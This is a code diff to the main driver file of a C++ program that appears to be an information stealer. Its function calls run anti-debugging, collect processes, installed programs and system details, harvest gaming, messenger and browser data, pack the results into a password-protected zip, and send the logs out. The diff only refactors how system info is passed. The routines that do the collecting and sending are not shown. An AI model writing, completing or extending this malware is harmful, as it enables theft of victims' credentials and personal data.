@@ -37,7 +37,7 @@
 void Functions();
 
 
-void SystemInfo(std::string& sendInfo);
+void SystemInfo();
 
 void Gaming();
 
@@ -45,7 +45,7 @@ void Messengers();
 
 void Other();
 
-void Ending(std::string& sendInfo);
+void Ending();
 
 /// <summary>
 /// Main function in the program. 
@@ -66,9 +66,7 @@ void Functions()
 		antidebug::AntiDebug();
 	manager::MakeDirs();
 
-	std::string sendInfo = "";
-
-	SystemInfo(sendInfo);
+	SystemInfo();
 
 	Gaming();
 
@@ -76,16 +74,16 @@ void Functions()
 
 	Other();
 
-	Ending(sendInfo);
+	Ending();
 }
 
-void SystemInfo(std::string& sendInfo)
+void SystemInfo()
 {
 	cursystem::GetProcesses();
 
 	cursystem::GetProgs();
 
-	cursystem::GetSysInfo(sendInfo);
+	cursystem::GetSysInfo();
 }
 
 void Gaming() 
@@ -126,12 +124,12 @@ void Other()
 	//browsers::FireFox();
 }
 
-void Ending(std::string& sendInfo)
+void Ending()
 {
 	std::string zipName;
 	std::string password;
 
 	manager::MakeZip(zipName, password);
 
-	manager::SendLogs(zipName, password, sendInfo);
+	manager::SendLogs(zipName, password);
 }
